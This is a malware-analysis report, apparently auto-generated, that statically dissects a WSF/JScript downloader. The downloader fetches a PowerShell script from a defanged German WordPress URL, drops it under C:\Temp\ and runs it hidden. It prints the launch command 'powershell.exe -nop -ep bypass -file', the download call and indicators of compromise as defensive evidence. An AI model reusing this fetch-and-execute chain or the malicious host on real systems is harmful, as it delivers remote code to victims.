---
title: "Malware Analysis: Unattributed WSF PowerShell Downloader (other · wsf · 2d792a60)"
published: 2026-11-02
draft: false
description: "Malicious (low confidence): Unattributed WSF PowerShell Downloader · downloader/loader/dropper · difficulty easy · static analysis only"
tags: ["downloader", "loader", "dropper", "Script"]
category: "恶意样本日报"
lang: "en"
translationOf: "2026-11-02-Unattributed-WSF-PowerShell-Downloader-2d792a60"
---

> [!WARNING]
> **Verdict: malicious** · Family **Unattributed WSF PowerShell Downloader** (doubtful) · Confidence **low**
> 
> Aliases: WSF/PS1 downloader, JScript staged PowerShell loader
> 
> The JScript logic embedded in the WSF is fully visible: it downloads a PowerShell script from a fixed HTTPS address, writes it to a randomly named .ps1 under C:\Temp\, and launches powershell.exe with a hidden window, no profile loading, and execution-policy bypass. The intent to download and execute remote code is clear, so it can be judged a malicious downloader/loader without relying on external intelligence.

## At a glance

| Item | Content |
|:--|:--|
| Family | **Unattributed WSF PowerShell Downloader** · Aliases WSF/PS1 downloader, JScript staged PowerShell loader · _doubtful_ |
| Confidence | **Low** |
| Behavior classes | downloader · loader · dropper |
| Difficulty | easy |
| First seen | 2026-11-02 08:03:27 |
| Analysis method | Static analysis only |
| Source | [MalwareBazaar](https://bazaar.abuse.ch/sample/2d792a60273e0b756e5efe2ef9275df360eb55faa365fdb2dffeb4a6ba431846/) |

## Attack chain

<svg viewBox="0 0 720 302" width="100%" role="img" aria-label="Attack chain overview" xmlns="http://www.w3.org/2000/svg" style="font-family:inherit;font-size:13px;line-height:1.2">
<defs><marker id="acArrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="currentColor" fill-opacity="0.55"/></marker></defs>
<line x1="26" y1="34" x2="26" y2="234" stroke="currentColor" stroke-opacity="0.22" stroke-width="2"/>
<circle cx="26" cy="34" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="39" fill="currentColor" font-weight="600" font-size="13.5">Fetch payload via MSXML</text>
<text x="470" y="39" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1071.001</text>
<text x="613" y="38" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="84" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="89" fill="currentColor" font-weight="600" font-size="13.5">Create temp directory</text>
<text x="470" y="89" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1074.001</text>
<text x="613" y="88" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="134" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="139" fill="currentColor" font-weight="600" font-size="13.5">Drop random-named PS1</text>
<text x="470" y="139" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1105</text>
<text x="613" y="138" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="184" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="189" fill="currentColor" font-weight="600" font-size="13.5">Launch PowerShell hidden</text>
<text x="470" y="189" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1059.001</text>
<text x="613" y="188" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
<circle cx="26" cy="234" r="7" fill="currentColor" fill-opacity="0.55"/>
<text x="56" y="239" fill="currentColor" font-weight="600" font-size="13.5">Bypass policy and profile</text>
<text x="470" y="239" fill="currentColor" fill-opacity="0.45" font-size="11" font-family="ui-monospace,monospace">T1562.001</text>
<text x="613" y="238" fill="currentColor" fill-opacity="0.45" font-size="11.5" text-anchor="middle">Static</text>
</svg>

## Sample identification

| Item | Value |
|:--|:--|
| SHA-256 | `2d792a60273e0b756e5efe2ef9275df360eb55faa365fdb2dffeb4a6ba431846` |
| MD5 | _not recorded_ |
| Size | 3,583 bytes (3.5 KB) |
| Type | other · `wsf` |

## Behavior analysis

**6** behaviors in total, each backed by evidence, and all are obtainable statically.

### 1. Fetch remote payload via MSXML

`T1071.001` · Confidence **High** · Static

Uses ActiveXObject('MSXML2.XMLHTTP') to issue a synchronous GET to hxxps://kronemedia[.]de/wp-content/plugins/wpqlxeq/KMSKMK[.]PS1, takes responseText as the next-stage script only on HTTP 200, and retries at most twice.

> **Evidence**: URL at string offset 0xE4; 'MSXML2.XMLHTTP' at offset 0x578; http.open('GET', State.url, false) / http.send at offset 0x5A3
> 
> **Source**: `ev-000001` · `ev-000002`

### 2. Create temp directory

`T1074.001` · Confidence **High** · Static

Uses Scripting.FileSystemObject to check whether C:\Temp\ exists and calls CreateFolder if not, using it as the staging directory for the downloaded payload.

> **Evidence**: FolderExists(State.dir) at offset 0x400 / fs.CreateFolder(State.dir) at 0x430; State.dir is 'C:\\Temp\\' at offset 0x131
> 
> **Source**: `ev-000001` · `ev-000002`

### 3. Drop random-named PS1

`T1105` · Confidence **High** · Static

Uses an 8-character [A-Z0-9] random string as the filename, writing the downloaded script text to C:\Temp\<token>.ps1 and overwriting any file with the same name.

> **Evidence**: pool='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' at offset 0x835; target=State.dir+token+'.ps1' at 0x8EF; fs.CreateTextFile(target,true) / handle.Write at 0x932
> 
> **Source**: `ev-000001` · `ev-000002`

### 4. Launch PowerShell in hidden window

`T1059.001` · Confidence **High** · Static

Calls WScript.Shell.Run with window style 0 (hidden) and waits for completion, executing powershell.exe against the dropped .ps1.

> **Evidence**: sh.Run('powershell.exe -nop -ep bypass -file "'+target+'"', 0, true) at offset 0x9AF
> 
> **Source**: `ev-000001` · `ev-000002`

### 5. Bypass execution policy and profile

`T1562.001` · Confidence **High** · Static

The PowerShell command line explicitly uses -nop (do not load the user profile) and -ep bypass (bypass the execution policy), reducing the chance of the script being blocked.

> **Evidence**: command-line string '-nop -ep bypass -file' from offset 0x9AF
> 
> **Source**: `ev-000001` · `ev-000002`

### 6. Parse and execute script via WSF

`T1059.007` · Confidence **High** · Static

The sample is delivered as a Windows Script File (XML + <script language="JScript"> CDATA) and parsed/executed by Windows Script Host; the entry point is Api.run at the end of the IIFE.

> **Evidence**: file header '<?xml version="1.0"?>', '<script language="JScript">' at offset 0x1E, 'Api.run;' at offset 0xDA9
> 
> **Source**: `ev-000001` · `ev-000002`


## IOC (de-weaponized)

### Network

:::caution
**Pending dynamic verification**: the addresses above were obtained statically; no successful connection or session was observed under the analysis environment's network isolation, and the real C2's responses and delivered content remain unknown.
:::

| Type | Value | Port | Role | Evidence source | Dynamic observation |
|:--|:--|--:|:--|:--|:--|
| http | `hxxps://kronemedia[.]de/wp-content/plugins/wpqlxeq/KMSKMK[.]PS1` | 443 | download | Static | ⏳ Not observed |

### Host

**Drop paths**

- `C:\Temp\`
- `C:\Temp\%RANDOM8%.ps1`

### Configuration

| Key | Value | Required | Evidence source |
|:--|:--|:--|:--|
| `c2_hosts` | `hxxps://kronemedia[.]de/wp-content/plugins/wpqlxeq/KMSKMK[.]PS1` | Yes | Static |
| `download_path` | `C:\Temp\` | Yes | Static |
| `dropped_filename` | `[A-Z0-9]{8}.ps1` | Yes | Static |
| `exec_command` | `powershell.exe -nop -ep bypass -file "C:\Temp\<token>.ps1"` | Yes | Static |
| `retries` | `2` | No | Static |
| `encryption_algo` | `-` | No | Static |

## Do not misjudge

:::important
The following conclusions are **easy to misjudge**; keep this in mind when citing this report.

- No encryption, file-encryption, or destructive logic was found; it should not be classified as ransomware / a wiper.
- This file does not access browser data, credential stores, or keyboard input; downloader behavior alone does not make it a stealer.
- No registry Run keys, scheduled tasks, services, or startup-folder writes were found, so this WSF itself has no persistence capability.
- The remote PS1 content was not obtained, so the final payload's family, real C2, and concrete functions cannot be asserted.
- The use of PowerShell does not by itself prove fileless execution or process injection; this script writes a file to disk and then invokes powershell.exe.
:::

## Analysis method and limitations

| Item | Content |
|:--|:--|
| Analysis method | Static analysis only |
| Unpacking | No |

**Limitations and open questions**

1. Static analysis only: the sample was not detonated in a sandbox, reproduced=false, and all behavior conclusions come from direct review of the script source.
2. The remote PS1 (KMSKMK.PS1) was not downloaded, so its content, subsequent C2, persistence method, and final family are unknown; the relevant fields are marked pending dynamic verification.
3. The domain kronemedia[.]de may already be defunct at analysis time, or may serve different content by source IP / User-Agent; its current state cannot be confirmed statically.
4. No actual network traffic was observed; the C2 entry is statically recovered (recoverability=static, pending_dynamic_verify=true).

## Evidence index

<details>
<summary>Expand 2 tool evidence entries</summary>

| Evidence ID | Tool | Summary |
|:--|:--|:--|
| `ev-000001` | String extraction | 105 ASCII strings extracted: download URL, C:\Temp\ path, three COM class names, PowerShell command line, and random filename generation constants, covering all key logic. |
| `ev-000002` | evidence.record | Execution chain and configuration derived from a line-by-line review of the embedded JScript (URL, drop directory, random-name rule, powershell command, retry count), registered as manual reasoning. |

</details>

---

_This report's sample is not public; IOCs have been de-weaponized and are for security research only._
